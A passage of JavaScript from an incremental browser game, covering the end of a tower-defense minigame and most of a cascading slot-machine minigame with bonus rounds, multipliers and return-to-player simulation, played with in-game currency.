        auraIndicator.style.border = '2px dashed rgba(255, 100, 100, 0.5)';
        auraIndicator.style.borderRadius = '50%';
        auraIndicator.style.background = 'rgba(255, 100, 100, 0.1)';
        auraIndicator.style.pointerEvents = 'none';
        auraIndicator.style.zIndex = '1';
        auraIndicator.title = `Slow Aura: ${towerStats.auraRange.toFixed(1)}m (${towerStats.slowAura.toFixed(1)}% slow)`;
        canvas.appendChild(auraIndicator);
    }
    
    // Create attack range indicator (outer circle)
    const rangeIndicator = document.createElement('div');
    rangeIndicator.className = 'tower-range-indicator';
    const attackRadius = towerStats.range * 30; // Convert meters to pixels (30px = 1m)
    rangeIndicator.style.position = 'absolute';
    rangeIndicator.style.left = (towerX - attackRadius) + 'px';
    rangeIndicator.style.top = (towerY - attackRadius) + 'px';
    rangeIndicator.style.width = (attackRadius * 2) + 'px';
    rangeIndicator.style.height = (attackRadius * 2) + 'px';
    rangeIndicator.style.border = '2px dashed rgba(100, 255, 100, 0.5)';
    rangeIndicator.style.borderRadius = '50%';
    rangeIndicator.style.background = 'rgba(100, 255, 100, 0.05)';
    rangeIndicator.style.pointerEvents = 'none';
    rangeIndicator.style.zIndex = '1';
    rangeIndicator.title = `Attack Range: ${towerStats.range.toFixed(1)}m`;
    canvas.appendChild(rangeIndicator);
}

function finishTowerDefense() {
    arcadeActive = false;
    
    // Clean up all enemies and projectiles
    arcadeEnemies.forEach(enemy => {
        if (enemy.element.parentNode) {
            enemy.element.remove();
        }
    });
    arcadeEnemies = [];
    arcadeProjectiles = [];
    arcadeEnemySpawnQueue = [];
    
    // Remove tower
    const tower = document.getElementById('tower');
    if (tower) {
        tower.remove();
    }
    
    // Clear any attack effects and range indicators
    const canvas = document.getElementById('arcade-game-canvas');
    const lines = canvas.querySelectorAll('div[style*="background: yellow"]');
    lines.forEach(line => line.remove());
    
    const rangeIndicators = canvas.querySelectorAll('.tower-range-indicator, .tower-aura-indicator');
    rangeIndicators.forEach(indicator => indicator.remove());
      spawnBoost(7);
    playLoseSound();
    gtag('event', 'arcade_end', {
        'event_category': 'tower_defense',
        'Wave': arcadeWave,
    });
}
// casino.js

// Define the possible symbols and their optional multiplier probability
const CASINO_SYMBOLS = ["A", "B", "C", "D", "E", "F", "G", "H"];
const CASINO_SYMBOLS_VALUES_LOW = 0.01;
const CASINO_SYMBOLS_VALUES_MEDIUM = 0.055;
const CASINO_SYMBOLS_VALUES_HIGH = 0.105;
const CASINO_SYMBOLS_VALUES = [CASINO_SYMBOLS_VALUES_LOW, CASINO_SYMBOLS_VALUES_LOW, CASINO_SYMBOLS_VALUES_LOW, CASINO_SYMBOLS_VALUES_LOW, CASINO_SYMBOLS_VALUES_LOW, CASINO_SYMBOLS_VALUES_MEDIUM, CASINO_SYMBOLS_VALUES_MEDIUM, CASINO_SYMBOLS_VALUES_HIGH];
const CASINO_MULTIPLIER_CHANCE = 0.01;
const CASINO_MAX_MULTIPLIER = 10000;
const CASINO_BONUS_CHANCE = 0.0025;
const CASINO_BONUS_SYMBOL = "BONUS";
const CASINO_STICKY_WILD_CHANCE = 0.02;
const CASINO_STICKY_WILD_SYMBOL = "WILD";
const CASINO_MAX_STICKY_WILDS = 2;
const CASINO_WAGER_TIERS = [1, 10, 100, 1000, 10000, 100000, 1000000, 10000000];

const CASINO_REELS = 9; // Number of reels
const CASINO_ROWS = 5;  // Number of rows per reel
const CASINO_SYMBOLS_TO_WIN = 13; // Number of symbols to win

// Initialize the board
let casinoBoard = Array.from({ length: CASINO_REELS }, () => Array(CASINO_ROWS).fill(null));
let casinoInit = false;
let casinoBusy = false;
let casinoWagerTier = 0;
let casinoScrollingCurrentPot = 0;
let casinoCurrentPot = 0;
let casinoStickyWildCount = 0;
let casinoReelsWithBonus = [];
let casinoMultiplier = 1;
let casinoLastMultiplier = 1;
let casinoBonusCount = 0;
let casinoInBonus = false;

function changeCasinoWage(tier) {
    if(casinoBusy) return; // Don't change wager while spinning
    if(tier > 0) {
        casinoWagerTier++;
        casinoWagerTier = Math.min(casinoWagerTier, CASINO_WAGER_TIERS.length - 1);
    } else {
        casinoWagerTier--;
        casinoWagerTier = Math.max(casinoWagerTier, 0);
    }
    document.getElementById("casino-payout-single-low").innerText = `$${formatShortScale(getWin("A", 1))}`;
    document.getElementById("casino-payout-13-low").innerText = `$${formatShortScale(getWin("A", 13))}`;
    
    document.getElementById("casino-payout-single-medium").innerText = `$${formatShortScale(getWin("F", 1))}`;
    document.getElementById("casino-payout-13-medium").innerText = `$${formatShortScale(getWin("F", 13))}`;
    
    document.getElementById("casino-payout-single-high").innerText = `$${formatShortScale(getWin("H", 1))}`;
    document.getElementById("casino-payout-13-high").innerText = `$${formatShortScale(getWin("H", 13))}`;
    
    document.getElementById("casino-feature1-cost").innerText = `$${formatShortScale(CASINO_WAGER_TIERS[casinoWagerTier] * 180)}`;
    document.getElementById("casino-feature2-cost").innerText = `$${formatShortScale(CASINO_WAGER_TIERS[casinoWagerTier] * 300)}`;
    document.getElementById("casino-feature3-cost").innerText = `$${formatShortScale(CASINO_WAGER_TIERS[casinoWagerTier] * 450)}`;
}

function getWin(symbol, count) {
    let value = CASINO_SYMBOLS_VALUES[CASINO_SYMBOLS.indexOf(symbol)];
    return value * count * CASINO_WAGER_TIERS[casinoWagerTier];
}

function displayCasino() {
    if(KeystrokeCasino.level > 0) {
        document.getElementById("casino-tab").disabled = false;
    }
    if(!casinoInit) {
        initCasino();
    }
    document.getElementById("casino-wager").textContent = formatShortScale(CASINO_WAGER_TIERS[casinoWagerTier]);
    document.getElementById("casino-balance").textContent = formatShortScale(keystrokesToDollars(keystrokesBank));
    casinoScrollingCurrentPot += (casinoCurrentPot - casinoScrollingCurrentPot) / Tickrate * 4;
    document.getElementById("casino-win-feedback2").textContent = `Win: $${formatShortScale(casinoScrollingCurrentPot)}`;
}

function initCasino() {
    casinoInit = true;
    for (let reel = 0; reel < CASINO_REELS; reel++) {
        let reelDiv = document.createElement("div");
        reelDiv.id = `casino-reel${reel + 1}`;
        reelDiv.classList.add("casino-reel");
        
        
        for (let row = 0; row < CASINO_ROWS; row++) {
            let symbolContainer = document.createElement("div");
            symbolContainer.classList.add("casino-symbol-container");
            symbolContainer.id = `casino-reel${reel + 1}-slot${row + 1}-container`;
            let slotDiv = document.createElement("div");
            slotDiv.id = `casino-reel${reel + 1}-slot${row + 1}`;
            slotDiv.classList.add("casino-slot");
            
            symbolContainer.appendChild(slotDiv);
            
            let symbolElement = document.createElement("div");
            symbolElement.classList.add("symbol-null");
            slotDiv.appendChild(symbolElement);
            reelDiv.appendChild(symbolContainer);
            
        }
        document.getElementById("casino-board").appendChild(reelDiv);
    }
}

function drawBoard() {
    for (let reel = 0; reel < CASINO_REELS; reel++) {
        for (let row = 0; row < CASINO_ROWS; row++) {
            let symbol = casinoBoard[reel][row];
            let element = document.getElementById(`casino-reel${reel + 1}-slot${row + 1}`).firstChild;
            CASINO_SYMBOLS.forEach(symbol => {
                element.classList.remove(`symbol-${symbol}`);
            });
            element.classList.remove("symbol-null", `symbol-${CASINO_BONUS_SYMBOL}`, `symbol-${CASINO_STICKY_WILD_SYMBOL}`, "symbol-x2", "symbol-x3", "symbol-x5", "symbol-x10", "symbol-x20", "symbol-x50", "symbol-x100");
            element.classList.add(`symbol-${symbol}`);
        }
    }
}
function drawSlot(reel, row) {
    let symbol = casinoBoard[reel][row];
    let element = document.getElementById(`casino-reel${reel + 1}-slot${row + 1}`).firstChild;
    CASINO_SYMBOLS.forEach(symbol => {
        element.classList.remove(`symbol-${symbol}`);
    });
    element.classList.remove("symbol-null", `symbol-${CASINO_BONUS_SYMBOL}`, `symbol-${CASINO_STICKY_WILD_SYMBOL}`, "symbol-x2", "symbol-x3", "symbol-x5", "symbol-x10", "symbol-x20", "symbol-x50", "symbol-x100");
    element.classList.add(`symbol-${symbol}`);
}


function randomMultiplier() {
    const r = Math.random();
    if (r < 0.0025) return 100; // chance: 0.25% 
    if (r < 0.01) return 50; // chance: 1%   
    if (r < 0.05) return 10; // chance: 5%  
    if (r < 0.1) return 5; // chance: 10%  
    if (r < 0.15) return 3; // chance: 15% 
    
    return 2;
}
let casinoMultiplierUpdateClear;
// Get a random symbol or multiplier
function randomSymbol(reel, visual = false, guaranteedBonusCount = 0) {
    if (Math.random() < CASINO_MULTIPLIER_CHANCE * (casinoInBonus ? 2 : 1)) {
        // Return a multiplier like x2, x3, etc.
        const multiplier = randomMultiplier();
        if(!visual) {
            casinoMultiplier += multiplier;
            casinoMultiplier = Math.min(casinoMultiplier, CASINO_MAX_MULTIPLIER);
        }
        return `x${multiplier}`;
    } else if(!casinoReelsWithBonus.includes(reel) && (Math.random() < CASINO_BONUS_CHANCE || guaranteedBonusCount > casinoReelsWithBonus.length)) {
        if(!visual) { 
            casinoReelsWithBonus.push(reel);
            casinoBonusCount++;
        }
        return CASINO_BONUS_SYMBOL;
    } else if(Math.random() < CASINO_STICKY_WILD_CHANCE && casinoStickyWildCount < CASINO_MAX_STICKY_WILDS) {
        if(!visual) casinoStickyWildCount++;
        return CASINO_STICKY_WILD_SYMBOL;
    }
    
    // Calculate the total weight
    const totalWeight = CASINO_SYMBOLS_VALUES.reduce((acc, value) => acc + (1 / value), 0);
    
    // Generate a random number between 0 and totalWeight
    let random = Math.random() * totalWeight;
    
    // Select a symbol based on the random number
    for (let i = 0; i < CASINO_SYMBOLS.length; i++) {
        random -= (1 / CASINO_SYMBOLS_VALUES[i]);
        if (random <= 0) {
            return CASINO_SYMBOLS[i];
        }
    }
    
    // Fallback in case of rounding errors
    return CASINO_SYMBOLS[CASINO_SYMBOLS.length - 1];
}

async function checkWins(simulation = false) {
    // Flatten the board to count symbol occurrences
    const allSymbols = casinoBoard.flat();
    let tally = {};
    
    if(!simulation) {
        if(casinoMultiplier > casinoLastMultiplier) {
            casinoLastMultiplier = casinoMultiplier;
            document.getElementById("casino-current-multiplier").textContent = casinoMultiplier;
            document.getElementById("casino-current-multiplier-container").classList.add("updated");
            if (casinoMultiplierUpdateClear) {
                clearTimeout(casinoMultiplierUpdateClear);
            }
            casinoMultiplierUpdateClear = setTimeout(() => {
                document.getElementById("casino-current-multiplier-container").classList.remove("updated");
            }, 500);
        }
    }
    
    allSymbols.forEach(symbol => {
        
        tally[symbol] = (tally[symbol] || 0) + 1;
        
    });
    
    // Add wilds to tally of each symbol
    if (casinoStickyWildCount > 0) {
        for (let symbol in tally) {
            tally[symbol] += casinoStickyWildCount;
        }
    }
    
    
    // Identify all symbols with at least 7 matches
    let totalWin = 0;
    let symbolsRemoved = 0;
    // first remove multipliers
    for (let symbol in tally) {
        if(symbol.startsWith("x")) {
            symbolsRemoved++;
            removeSymbol(symbol, simulation);
            if(!simulation) {
                playSlotWinSound();
                await new Promise(resolve => setTimeout(resolve, 1500));
                for (let reel = 0; reel < CASINO_REELS; reel++) {
                    for (let row = 0; row < CASINO_ROWS; row++) {
                        const element = document.querySelector(`#casino-reel${reel + 1}-slot${row + 1}`);
                        element.classList.remove('slot-pop-win'); // Remove the win animation from wilds
                    }
                }
            }
        }
    }
    // remove other symbols
    for (let symbol in tally) {
        if(symbol.startsWith("x")) {
            
        } else if(symbol === CASINO_BONUS_SYMBOL) {
            
        }else if (tally[symbol] >= CASINO_SYMBOLS_TO_WIN) {
            symbolsRemoved++;
            let win = getWin(symbol, tally[symbol]) * casinoMultiplier;
            totalWin += win;
            casinoCurrentPot += win;
            if(!simulation) {
                document.getElementById("casino-win-feedback1").innerHTML = `<div><div class="casino-slot tiny-slot"><div class="symbol-${symbol}"></div></div>${tally[symbol]}x ($${formatShortScale(getWin(symbol, tally[symbol]))}) * ${casinoMultiplier}x = $${formatShortScale(win)}</div>`;
                let winFeedElement = document.createElement("div");
                winFeedElement.innerHTML = `<div><div class="casino-slot tiny-slot"><div class="symbol-${symbol}"></div></div>${tally[symbol]}x * ${casinoMultiplier}x = $${formatShortScale(win)}</div>`;
                document.getElementById("casino-win-feed").appendChild(winFeedElement);
            }
            removeSymbol(symbol, simulation);
            if(!simulation) {
                playSlotWinSound();
                await new Promise(resolve => setTimeout(resolve, 1500));
                for (let reel = 0; reel < CASINO_REELS; reel++) {
                    for (let row = 0; row < CASINO_ROWS; row++) {
                        const element = document.querySelector(`#casino-reel${reel + 1}-slot${row + 1}`);
                        element.classList.remove('slot-pop-win'); // Remove the win animation from wilds
                    }
                }
            }
        }
    }
    
    
    if(symbolsRemoved > 0) {
        await FallSymbols(simulation);
        if(!simulation) {
            await new Promise(resolve => setTimeout(resolve, 700));
            drawBoard();
        }
    }
    if(!simulation) {
        for (let reel = 0; reel < CASINO_REELS; reel++) {
            for (let row = 0; row < CASINO_ROWS; row++) {
                const element = document.querySelector(`#casino-reel${reel + 1}-slot${row + 1}`);
                if(element.classList.contains('slot-pop-out') || element.classList.contains('slot-fade-out') || element.classList.contains('slot-hidden')) {
                    element.classList.remove('slot-pop-out');
                    element.classList.remove('slot-fade-out');
                    element.classList.remove('slot-hidden');
                    element.classList.add('slot-pop-in');
                    playBuySound();
                    await new Promise(resolve => setTimeout(resolve, 50));
                }
            }
        }
        await new Promise(resolve => setTimeout(resolve, 300));
        for (let reel = 0; reel < CASINO_REELS; reel++) {
            for (let row = 0; row < CASINO_ROWS; row++) {
                const element = document.querySelector(`#casino-reel${reel + 1}-slot${row + 1}`);
                element.classList.remove('slot-pop-out');
                element.classList.remove('slot-pop-in');
                element.classList.remove('slot-fade-out');
                element.classList.remove('slot-fall-down');
            }
        }
    }
    
    return {totalWin, symbolsRemoved};
}

async function FallSymbols(simulation = false) {
    // We'll handle each reel separately
    const fallPromises = [];
    
    for (let reel = 0; reel < CASINO_REELS; reel++) {
        // 1) Collect the old state
        const oldReelSymbols = casinoBoard[reel].map((symbol, row) => ({ symbol, row }));
        
        // 2) Build the new arrangement for this reel
        const remainingSymbols = oldReelSymbols.filter(s => s.symbol !== null); // all non-null
        const newSymbolCount = CASINO_ROWS - remainingSymbols.length;
        // Generate brand new symbols for the top
        const newSymbols = Array.from({ length: newSymbolCount }, () => ({ symbol: randomSymbol(reel), row: -1 }));
        // Combine them to form the new reel (top are new, bottom are old)
        const newReel = [...newSymbols, ...remainingSymbols];
        
        if(simulation) {
            // If we're simulating, just update the board
            for (let row = 0; row < CASINO_ROWS; row++) {
                casinoBoard[reel][row] = newReel[row].symbol;
            }
        } else {
            // 3) Animate from the old reel to the new reel
            //    (the actual falling transition)
            fallPromises.push(animateFall(reel, oldReelSymbols, newReel).then(() => {
                // 4) Now that the reel has visually animated,
                //    finalize the new arrangement in `casinoBoard`
                for (let row = 0; row < CASINO_ROWS; row++) {
                    casinoBoard[reel][row] = newReel[row].symbol;
                }
            }));
        }
    }
    
    // Wait for all reels to finish falling
    await Promise.all(fallPromises);
    
    // 5) Finally draw the board so the real slots match the new arrangement
    if(!simulation) {
        drawBoard();
        playSlotFallSound();
    }
}
/**
* Animate a single reel's transition from `oldReel` to `newReel`.
* `oldReel` is an array of {symbol, row}.
* `newReel` is an array of {symbol, row}.
*/
function animateFall(reelIndex, oldReel, newReel) {
    return new Promise(resolve => {
        // The parent reel container
        const reelDiv = document.getElementById(`casino-reel${reelIndex + 1}`);
        const slotHeight = 4; // in rem (assuming your slot is 4rem tall)
        const remToPx = getRemInPixels(); // We'll need to convert 1rem => px
        
        // 1) Create ghost elements for every symbol that *survives*
        //    (i.e. oldReel symbol != null)
        const ghosts = [];
        
        // We'll map old positions to new positions for each symbol
        // that remains (not for null).
        // Also, for newly spawned symbols (row = -1 in oldReel),
        // they will start above the top (some negative row).
        // We'll give them an "oldRow" so they can animate from above.
        const symbolToNewRow = new Map(); // key: index in oldReel, value: newRow
        
        // figure out the final row for each symbol (including new ones)
        // We'll label them from top (0) down to bottom (CASINO_ROWS-1).
        // newReel[0] is top, newReel[1], etc.
        // We'll do a quick pass to see how each old symbol lines up in the new array.
        
        // Build an array to match each newReel item with the old item
        // old items that remain should match on symbol (and row != null).
        // new items have row = -1 (or symbol newly generated).
        // We can do it in a simpler approach: we'll just track the old "remainingSymbols" order.
        // Because you already built newReel as [...newSymbols, ...remainingSymbols],
        // we know that the items from newSymbols are brand new,
        // and the items from remainingSymbols are from oldReel in the same order.
        
        // We'll do a small pass on newReel to see if it's from newSymbols or oldReel.
        for (let newRow = 0; newRow < newReel.length; newRow++) {
            const newItem = newReel[newRow];
            // old row is newItem.row (if it's >= 0, it came from oldReel)
            // if it's -1, it's brand new
            let oldRow = newItem.row;
            symbolToNewRow.set(newItem, newRow); 
            // We'll store an "oldRow" property so we can animate from old to new
            newItem.__oldRow = oldRow;
            newItem.__newRow = newRow;
        }
        
        // For each item in oldReel, create a ghost if it wasn't null
        // (meaning it used to exist on the board).
        for (let i = 0; i < oldReel.length; i++) {
            const { symbol, row } = oldReel[i];
            if (symbol === null) continue;
            
            // Find where this symbol ended up in newReel
            // Because your code can have duplicates of the same symbol,
            // we can’t just search by "symbol." So we rely on the object references
            // or the order. An easier approach is to rely on the fact that
            // "remainingSymbols" are appended in order. So let's see:
            
            // We'll find the first newReel item that has the same row (meaning same object).
            // But you haven't carried the row forward in your code, so let's rely on the object reference or index.
            
            // Since you do "remainingSymbols.push({symbol, original_row})" in your original code,
            // we'd have to keep track of it. For simplicity, let's just animate all old symbols that remain downward,
            // ignoring any identical duplicates. If your game can have multiple identical symbols,
            // we may need a better matching approach.
            
            // For demonstration, let's just animate them if the symbol is not null,
            // and we find a place in newReel that had the same row = oldRow. 
            // If we can't find it, it's presumably been removed.
            const newItem = newReel.find(x => x.row === row && x.symbol === symbol);
            if (!newItem) {
                // That means it's removed. We won't animate a fall.
                // It's handled by "slot-pop-out" or fade-out, etc.
                continue;
            }
            
            // We'll build a ghost element
            const slotElem = document.getElementById(`casino-reel${reelIndex + 1}-slot${row + 1}`);
            if (!slotElem) continue;
            
            // Get bounding box of the current slot, so we know where to position the ghost
            const box = slotElem.getBoundingClientRect();
            
            // Create a ghost <div> that looks the same as the slot
            const ghost = document.createElement('div');
            // Copy the style that indicates which symbol it is
            // (Alternatively, you can create an inner child with the same classes.)
            ghost.innerHTML = slotElem.innerHTML; 
            ghost.className = slotElem.className;
            slotElem.classList.add('slot-hidden');
            ghost.classList.add('slot-ghost');
            
            // Place it in the reel container so "position: absolute" is relative to it
            reelDiv.appendChild(ghost);
            
            // Convert absolute coordinates
            const reelBox = reelDiv.getBoundingClientRect();
            const offsetLeft = box.left - reelBox.left;
            const offsetTop = box.top - reelBox.top;
            
            // Set initial position of the ghost
            ghost.style.left = offsetLeft + 'px';
            ghost.style.top = offsetTop + 'px';
            
            // Store the newRow so we know where it’s heading
            ghost.dataset.oldRow = row;
            ghost.dataset.newRow = newItem.__newRow;
            ghosts.push(ghost);
        }
        
        // 2) Force reflow so initial positions are applied
        // (some browsers won't animate unless we read offset* or do getComputedStyle)
        void reelDiv.offsetHeight;
        // 3) Move each ghost to its new row
        ghosts.forEach(ghost => {
            const oldRow = parseInt(ghost.dataset.oldRow, 10);
            const newRow = parseInt(ghost.dataset.newRow, 10);
            
            // The vertical distance in terms of rows
            const deltaRows = (newRow - oldRow);
            ghost.dataset.deltaRows = deltaRows;
            // Animate using translateY
            // We'll do something like: transform: `translateY(deltaRows * slotHeightInPx)`
            ghost.style.transform = `translateY(${deltaRows * slotHeight * remToPx}px)`;
        });
        
        // 4) After transition ends, remove ghosts
        // We'll listen for "transitionend" from the last ghost to finish
        let finished = 0;
        ghosts.forEach(ghost => {
            ghost.addEventListener('transitionend', () => {
                finished++;
                // remove the ghost
                ghost.remove();
                const oldRow = parseInt(ghost.dataset.oldRow, 10);
                const deltaRow = parseInt(ghost.dataset.deltaRows, 10);
                
                const oldRowElem = document.querySelector(`#casino-reel${reelIndex + 1}-slot${oldRow+ 1}`);
                const newRowElem = document.querySelector(`#casino-reel${reelIndex + 1}-slot${oldRow + deltaRow + 1}`);
                casinoBoard[reelIndex][oldRow+deltaRow] = newReel[oldRow+deltaRow].symbol;
                
                newRowElem.className = "casino-slot";
                if(deltaRow > 0) {
                    newRowElem.classList.add("slot-fall-down");
                }
                drawSlot(reelIndex, oldRow+deltaRow);
                // if all ghosts are done, resolve
                if (finished === ghosts.length) {
                    resolve();
                }
            });
        });
        
        // Edge case: If no ghosts exist, just resolve immediately
        if (ghosts.length === 0) {
            resolve();
        }
    });
}

/**
* Utility: returns how many pixels in 1rem, e.g. 16, 14, etc.
*/
function getRemInPixels() {
    return parseFloat(getComputedStyle(document.documentElement).fontSize);
}
// Remove a matched symbol and drop new ones
function removeSymbol(symbol, simulation = false) {
    // Mark all instances of the symbol as null and add pop-out animation
    for (let reel = 0; reel < CASINO_REELS; reel++) {
        for (let row = 0; row < CASINO_ROWS; row++) {
            if (casinoBoard[reel][row] === symbol) {
                if(!simulation) {
                    const element = document.querySelector(`#casino-reel${reel + 1}-slot${row + 1}`);
                    if (element) {
                        element.classList.add('slot-pop-out');
                        element.classList.remove('slot-pop-in');
                    }
                }
                casinoBoard[reel][row] = null;
            } else if(casinoBoard[reel][row] !== null) {
                if(!simulation) {
                    if(casinoBoard[reel][row] === CASINO_STICKY_WILD_SYMBOL || casinoBoard[reel][row].startsWith("x")) {
                        const element = document.querySelector(`#casino-reel${reel + 1}-slot${row + 1}`);
                        if (element) {
                            element.classList.add('slot-pop-win');
                            element.classList.remove('slot-pop-in');
                        }
                    }
                }
            }
        }
    }
}


async function animateReel(reelIndex, finalSymbols, spins = 15, spinDelay = 60) {
    return new Promise((resolve) => {
        let count = 0;
        document.getElementById(`casino-reel${reelIndex + 1}`).classList.add('casino-reel-spinning');
        // We'll use setInterval to randomly fill this reel several times,
        // then stop and reveal the final symbols.
        let spinInterval = setInterval(() => {
            // Randomize the reel temporarily
            for (let row = 0; row < CASINO_ROWS; row++) {
                casinoBoard[reelIndex][row] = randomSymbol(reelIndex, true); 
            }
            drawBoard();
            
            count++;
            if (count >= spins) {
                clearInterval(spinInterval);
                
                // Reveal the final symbols for this reel
                for (let row = 0; row < CASINO_ROWS; row++) {
                    casinoBoard[reelIndex][row] = finalSymbols[row];
                }
                drawBoard();
                
                // Done spinning this reel
                document.getElementById(`casino-reel${reelIndex + 1}`).classList.remove('casino-reel-spinning');
                playClickSound();
                resolve();
            }
        }, spinDelay);
    });
}
async function spinReels(simulation = false, guaranteedBonusCount = 0) {
    if(simulation) {
        for (let reel = 0; reel < CASINO_REELS; reel++) {
            for (let row = 0; row < CASINO_ROWS; row++) {
                casinoBoard[reel][row] = randomSymbol(reel, false, guaranteedBonusCount);
            }
        }
    } else {
        // 1) Fade out all slots
        for (let reel = 0; reel < CASINO_REELS; reel++) {
            for (let row = 0; row < CASINO_ROWS; row++) {
                document.querySelector(`#casino-reel${reel + 1}-slot${row + 1}`).classList.add('slot-fade-out');
            }
        }
        await new Promise(resolve => setTimeout(resolve, 700));  // Wait for fade out
        
        // 2) Generate the final spin results, but store them separately
        // ------------------------------------------------------------
        // Instead of writing directly to casinoBoard, we build a 2D array of final results
        let finalBoard = Array.from({ length: CASINO_REELS }, () => Array(CASINO_ROWS).fill(null));
        
        for (let reel = 0; reel < CASINO_REELS; reel++) {
            for (let row = 0; row < CASINO_ROWS; row++) {
                finalBoard[reel][row] = randomSymbol(reel, false, guaranteedBonusCount);
            }
        }
        
        // 3) Animate each reel in sequence (typical slot-machine style)
        for (let reel = 0; reel < CASINO_REELS; reel++) {
            // Remove the fade-out class so we can begin spinning
            for (let row = 0; row < CASINO_ROWS; row++) {
                let slotElem = document.querySelector(`#casino-reel${reel + 1}-slot${row + 1}`);
                slotElem.classList.remove('slot-fade-out');
            }
        }
        await Promise.all(Array.from({ length: CASINO_REELS }, (_, i) => animateReel(i, finalBoard[i], 15 + i * 15, 10)));
    }
}

let casinoSimulationTimesEnteredBonus = 0;
let casinoSimulationBonusGamesPlayed = 0;

async function SimulateSpin(guaranteedBonusCount = 0) {
    casinoBusy = true;
    casinoCurrentPot = 0;
    casinoStickyWildCount = 0;
    casinoReelsWithBonus = [];
    casinoMultiplier = 1;
    casinoLastMultiplier = 1;
    casinoBonusCount = 0;
    casinoInBonus = false;
    
    await spinReels(true, guaranteedBonusCount);
    let totalWin = 0;
    let win = await checkWins(true);
    while (win.symbolsRemoved > 0) {
        win = await checkWins(true);
        totalWin += win.totalWin;
    }
    if(casinoBonusCount >= 3) {
        casinoInBonus = true;
        casinoSimulationTimesEnteredBonus++;
        let bonusGames = casinoBonusCount * 5;
        let bonusTotalWin = 0;
        for (let i = 0; i < bonusGames; i++) {
            casinoSimulationBonusGamesPlayed++;
            casinoStickyWildCount = 0;
            casinoBonusCount = 0;
            await spinReels(true);
            let bonusWin = await checkWins(true);
            while (bonusWin.symbolsRemoved > 0) {
                bonusTotalWin += bonusWin.totalWin;
                bonusWin = await checkWins(true);
            }
            if(casinoBonusCount > 3) {
                bonusGames += casinoBonusCount * 5;
            }
        }
        totalWin += bonusTotalWin;
    }
    casinoInBonus = false;
    casinoBusy = false;
    return totalWin;
}
async function simulateBonus(bonusCount) {
    return await SimulateSpin(bonusCount);
}

async function SimulateSpins(count) {
    casinoSimulationTimesEnteredBonus = 0;
    casinoSimulationBonusGamesPlayed = 0;
    let totalWin = 0;
    let highestWin = 0;
    let totalBet = count * CASINO_WAGER_TIERS[casinoWagerTier];
    for (let i = 0; i < count; i++) {
        let win = await SimulateSpin();
        totalWin += win;
        highestWin = Math.max(highestWin, win);
    }
    const rtp = (totalWin / totalBet) * 100;
    console.log(`Completed ${count} spins at $${CASINO_WAGER_TIERS[casinoWagerTier]} each`);
    console.log(`Total Bet: $${totalBet.toFixed(2)}`);
    console.log(`Total Returned: $${totalWin.toFixed(2)}`);
    console.log(`Highest Win: $${highestWin.toFixed(2)}`);
    console.log(`Times Entered Bonus: ${casinoSimulationTimesEnteredBonus}`);
    console.log(`Bonus Games Played: ${casinoSimulationBonusGamesPlayed}`);
    console.log(`Chance of Entering Bonus: ${(casinoSimulationTimesEnteredBonus / count * 100).toFixed(2)}%`);
    console.log(`RTP: ${rtp.toFixed(2)}%`);
    return totalWin;
}
async function SimulateBonuses(count, bonusCount) {
    let totalWin = 0;
    let highestWin = 0;
    let totalBet = count * CASINO_WAGER_TIERS[casinoWagerTier];
    for (let i = 0; i < count; i++) {
        let win = await simulateBonus(bonusCount);
        totalWin += win;
        highestWin = Math.max(highestWin, win);
    }
    const rtp = (totalWin / totalBet) * 100;
    const suggestedPrice = (totalWin / 0.95) / count; // Calculate suggested price for 95% RTP
    console.log(`Completed ${count} bonus games with guaranteed ${bonusCount} bonus symbols each`);
    console.log(`Total Bet: $${totalBet.toFixed(2)}`);
    console.log(`Total Returned: $${totalWin.toFixed(2)}`);
    console.log(`Average Win: $${(totalWin / count).toFixed(2)}`);
    console.log(`Highest Win: $${highestWin.toFixed(2)}`);
    console.log(`RTP: ${rtp.toFixed(2)}%`);
    console.log(`Suggested Price for 95% RTP: $${suggestedPrice.toFixed(2)}`);
    return totalWin;
}
async function startCasinoGame(bonusBuy = 0) {
    if (casinoBusy) return;
    let bonusBuyCostMultiplier = 1;
    let guaranteedBonusCount = 0;
    if(bonusBuy === 1) {
        bonusBuyCostMultiplier = 180;
        guaranteedBonusCount = 3;
    }
    if(bonusBuy === 2) {
        bonusBuyCostMultiplier = 300;
        guaranteedBonusCount = 4;
    }
    if(bonusBuy === 3) {
        bonusBuyCostMultiplier = 450;
        guaranteedBonusCount = 5;
    }
    let cost_in_keystrokes = dollarsToKeystrokes(CASINO_WAGER_TIERS[casinoWagerTier] * bonusBuyCostMultiplier);
    if (keystrokesBank < cost_in_keystrokes) {
        document.getElementById("casino-win-feedback1").innerHTML = `<i>Not enough funds!</i>`;
        return;
    }
    keystrokesBank -= cost_in_keystrokes;
    casinoScrollingCurrentPot = 0;
    
    casinoBusy = true;
    casinoCurrentPot = 0;
    casinoStickyWildCount = 0;
    casinoReelsWithBonus = [];
    casinoMultiplier = 1;
    casinoLastMultiplier = 1;
    casinoBonusCount = 0;
    casinoInBonus = false;
    document.getElementById("casino-bonus-display").style.display = "none";
    document.getElementById("casino-board").classList.remove("casino-bonus");
    document.getElementById("casino-current-multiplier").textContent = "1";
    // Clear any old win messages
    document.getElementById("casino-win-feed").innerHTML = "";
    document.getElementById("casino-win-feedback1").innerHTML = `<i>Good luck!</i>`;
    
    // Spin the reels
    await spinReels(false, guaranteedBonusCount);
    
    
    let win = await checkWins();
    while (win.symbolsRemoved > 0) {
        //casinoCurrentPot += win;
        win = await checkWins();
        await new Promise(resolve => setTimeout(resolve, 100));
    }
    
    if (casinoBonusCount >= 3) {
        playAchievementSound();
        document.getElementById("casino-board").classList.add("casino-bonus");
        document.getElementById("casino-bonus-display").style.display = "block";
        casinoInBonus = true;
        let bonusGames = casinoBonusCount * 5;
        document.getElementById("casino-bonus-display").innerHTML = `Bonus game 0/${bonusGames}`;
        document.getElementById("casino-win-feedback1").innerHTML = `You've unlocked ${bonusGames} bonus games!`;
        for (let reel = 0; reel < CASINO_REELS; reel++) {
            for (let row = 0; row < CASINO_ROWS; row++) {
                if (casinoBoard[reel][row] === CASINO_BONUS_SYMBOL) {
                    // pop win bonus symbols
                    const element = document.querySelector(`#casino-reel${reel + 1}-slot${row + 1}`);
                    element.classList.add('slot-pop-win');
                }
            }
        }
        await new Promise(resolve => setTimeout(resolve, 2000));
        for (let reel = 0; reel < CASINO_REELS; reel++) {
            for (let row = 0; row < CASINO_ROWS; row++) {
                if (casinoBoard[reel][row] === CASINO_BONUS_SYMBOL) {
                    const element = document.querySelector(`#casino-reel${reel + 1}-slot${row + 1}`);
                    element.classList.remove('slot-pop-win');
                }
            }
        }
        await new Promise(resolve => setTimeout(resolve, 500));
        let bonusTotalWin = 0;
